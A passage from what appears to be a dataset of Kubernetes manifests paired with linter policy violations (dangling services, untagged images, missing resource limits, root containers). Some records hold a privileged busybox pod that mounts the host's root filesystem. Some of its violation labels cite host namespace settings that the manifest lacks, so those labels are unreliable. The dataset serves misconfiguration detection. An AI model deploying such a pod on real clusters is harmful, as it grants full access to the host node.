'#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "11456",
    "manifest_path": "data/manifests/the_stack_sample/sample_4410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: glob:3.2.*\n    fluxcd.io/locked_msg: 3.2.2 does not work for us\n    fluxcd.io/locked_user: Jibin George <hello@jibingeo.com>\n    fluxcd.io/locked: 'true'\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.2.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "11457",
    "manifest_path": "data/manifests/the_stack_sample/sample_4410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: glob:3.2.*\n    fluxcd.io/locked_msg: 3.2.2 does not work for us\n    fluxcd.io/locked_user: Jibin George <hello@jibingeo.com>\n    fluxcd.io/locked: 'true'\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.2.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "11458",
    "manifest_path": "data/manifests/the_stack_sample/sample_4410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: glob:3.2.*\n    fluxcd.io/locked_msg: 3.2.2 does not work for us\n    fluxcd.io/locked_user: Jibin George <hello@jibingeo.com>\n    fluxcd.io/locked: 'true'\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.2.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "11459",
    "manifest_path": "data/manifests/the_stack_sample/sample_4410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: glob:3.2.*\n    fluxcd.io/locked_msg: 3.2.2 does not work for us\n    fluxcd.io/locked_user: Jibin George <hello@jibingeo.com>\n    fluxcd.io/locked: 'true'\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.2.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "11460",
    "manifest_path": "data/manifests/the_stack_sample/sample_4410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: glob:3.2.*\n    fluxcd.io/locked_msg: 3.2.2 does not work for us\n    fluxcd.io/locked_user: Jibin George <hello@jibingeo.com>\n    fluxcd.io/locked: 'true'\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.2.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "11461",
    "manifest_path": "data/manifests/the_stack_sample/sample_4411.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: gateway\n  namespace: openfaas\n  labels:\n    app: gateway\nspec:\n  type: NodePort\n  ports:\n  - port: 8080\n    protocol: TCP\n    targetPort: 8080\n    nodePort: 31112\n    name: gateway\n  - port: 8082\n    protocol: TCP\n    targetPort: 8082\n    name: prometheus\n  selector:\n    app: gateway\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:gateway])"
  },
  {
    "id": "11462",
    "manifest_path": "data/manifests/the_stack_sample/sample_4412.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\n  annotations:\n    value: wow\n    cost-estimator.kpt.io/monthly-cost: '44.03'\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress\n        name: wordpress\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 200m\n          limits:\n            memory: 256Mi\n            cpu: 250m\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: 127.0.0.1:3306\n        - name: WORDPRESS_DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        ports:\n        - containerPort: 80\n          name: wordpress\n        volumeMounts:\n        - name: wordpress-persistent-storage\n          mountPath: /var/www/html\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        resources:\n          requests:\n            memory: 40Mi\n            cpu: 200m\n          limits:\n            memory: 64Mi\n            cpu: 250m\n        command:\n        - /cloud_sql_proxy\n        - -instances=${INSTANCE_CONNECTION_NAME}=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      volumes:\n      - name: wordpress-persistent-storage\n        persistentVolumeClaim:\n          claimName: wordpress-volumeclaim\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"wordpress\" is using an invalid container image, \"wordpress\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11463",
    "manifest_path": "data/manifests/the_stack_sample/sample_4412.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\n  annotations:\n    value: wow\n    cost-estimator.kpt.io/monthly-cost: '44.03'\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress\n        name: wordpress\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 200m\n          limits:\n            memory: 256Mi\n            cpu: 250m\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: 127.0.0.1:3306\n        - name: WORDPRESS_DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        ports:\n        - containerPort: 80\n          name: wordpress\n        volumeMounts:\n        - name: wordpress-persistent-storage\n          mountPath: /var/www/html\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        resources:\n          requests:\n            memory: 40Mi\n            cpu: 200m\n          limits:\n            memory: 64Mi\n            cpu: 250m\n        command:\n        - /cloud_sql_proxy\n        - -instances=${INSTANCE_CONNECTION_NAME}=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      volumes:\n      - name: wordpress-persistent-storage\n        persistentVolumeClaim:\n          claimName: wordpress-volumeclaim\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11464",
    "manifest_path": "data/manifests/the_stack_sample/sample_4412.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\n  annotations:\n    value: wow\n    cost-estimator.kpt.io/monthly-cost: '44.03'\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress\n        name: wordpress\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 200m\n          limits:\n            memory: 256Mi\n            cpu: 250m\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: 127.0.0.1:3306\n        - name: WORDPRESS_DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        ports:\n        - containerPort: 80\n          name: wordpress\n        volumeMounts:\n        - name: wordpress-persistent-storage\n          mountPath: /var/www/html\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        resources:\n          requests:\n            memory: 40Mi\n            cpu: 200m\n          limits:\n            memory: 64Mi\n            cpu: 250m\n        command:\n        - /cloud_sql_proxy\n        - -instances=${INSTANCE_CONNECTION_NAME}=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      volumes:\n      - name: wordpress-persistent-storage\n        persistentVolumeClaim:\n          claimName: wordpress-volumeclaim\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cloudsql-proxy\" does not have a read-only root file system"
  },
  {
    "id": "11465",
    "manifest_path": "data/manifests/the_stack_sample/sample_4412.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\n  annotations:\n    value: wow\n    cost-estimator.kpt.io/monthly-cost: '44.03'\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress\n        name: wordpress\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 200m\n          limits:\n            memory: 256Mi\n            cpu: 250m\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: 127.0.0.1:3306\n        - name: WORDPRESS_DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        ports:\n        - containerPort: 80\n          name: wordpress\n        volumeMounts:\n        - name: wordpress-persistent-storage\n          mountPath: /var/www/html\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        resources:\n          requests:\n            memory: 40Mi\n            cpu: 200m\n          limits:\n            memory: 64Mi\n            cpu: 250m\n        command:\n        - /cloud_sql_proxy\n        - -instances=${INSTANCE_CONNECTION_NAME}=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      volumes:\n      - name: wordpress-persistent-storage\n        persistentVolumeClaim:\n          claimName: wordpress-volumeclaim\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wordpress\" does not have a read-only root file system"
  },
  {
    "id": "11466",
    "manifest_path": "data/manifests/the_stack_sample/sample_4412.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\n  annotations:\n    value: wow\n    cost-estimator.kpt.io/monthly-cost: '44.03'\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress\n        name: wordpress\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 200m\n          limits:\n            memory: 256Mi\n            cpu: 250m\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: 127.0.0.1:3306\n        - name: WORDPRESS_DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        ports:\n        - containerPort: 80\n          name: wordpress\n        volumeMounts:\n        - name: wordpress-persistent-storage\n          mountPath: /var/www/html\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        resources:\n          requests:\n            memory: 40Mi\n            cpu: 200m\n          limits:\n            memory: 64Mi\n            cpu: 250m\n        command:\n        - /cloud_sql_proxy\n        - -instances=${INSTANCE_CONNECTION_NAME}=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      volumes:\n      - name: wordpress-persistent-storage\n        persistentVolumeClaim:\n          claimName: wordpress-volumeclaim\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wordpress\" is not set to runAsNonRoot"
  },
  {
    "id": "11467",
    "manifest_path": "data/manifests/the_stack_sample/sample_4413.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: idtdaemon\n  namespace: idt\nspec:\n  selector:\n    app: idtdaemon\n  ports:\n  - port: 80\n    targetPort: 3000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:idtdaemon])"
  },
  {
    "id": "11468",
    "manifest_path": "data/manifests/the_stack_sample/sample_4414.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: postgres\n    context: DevOpsDemo\n  name: postgres\nspec:\n  ports:\n  - port: 5432\n    name: postgres-port\n  selector:\n    name: postgres\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:postgres])"
  },
  {
    "id": "11469",
    "manifest_path": "data/manifests/the_stack_sample/sample_4416.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: idtapi\n  namespace: idt-test\nspec:\n  selector:\n    app: idtapi\n  ports:\n  - port: 80\n    targetPort: 3000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:idtapi])"
  },
  {
    "id": "11470",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "host-ipc",
    "violation_text": "resource shares host's IPC namespace (via hostIPC=true)."
  },
  {
    "id": "11471",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "11472",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "11473",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "11474",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"busybox\" has AllowPrivilegeEscalation set to true."
  },
  {
    "id": "11475",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"busybox\" is privileged"
  },
  {
    "id": "11476",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "11477",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/\" is mounted on container \"busybox\""
  },
  {
    "id": "11478",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "11479",
    "manifest_path": "data/manifests/the_stack_sample/sample_4418.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: busybox-filesystem\n  name: busybox-filesystem\nspec:\n  volumes:\n  - name: host-fs\n    hostPath:\n      path: /\n  containers:\n  - image: busybox:1.32.0\n    name: busybox\n    command:\n    - /bin/sh\n    - -c\n    - sleep infinity\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true\n    volumeMounts:\n    - name: host-fs\n      mountPath: /host\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "11480",
    "manifest_path": "data/manifests/the_stack_sample/sample_4420.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: oim-malloc-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n    command:\n    - sleep\n    - '1000000'\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: oim-malloc-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"my-frontend\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11481",
    "manifest_path": "data/manifests/the_stack_sample/sample_4420.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: oim-malloc-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n    command:\n    - sleep\n    - '1000000'\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: oim-malloc-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"my-frontend\" does not have a read-only root file system"
  },
  {
    "id": "11482",
    "manifest_path": "data/manifests/the_stack_sample/sample_4420.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: oim-malloc-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n    command:\n    - sleep\n    - '1000000'\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: oim-malloc-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"my-frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "11483",
    "manifest_path": "data/manifests/the_stack_sample/sample_4420.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: oim-malloc-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n    command:\n    - sleep\n    - '1000000'\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: oim-malloc-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"my-frontend\" has cpu request 0"
  },
  {
    "id": "11484",
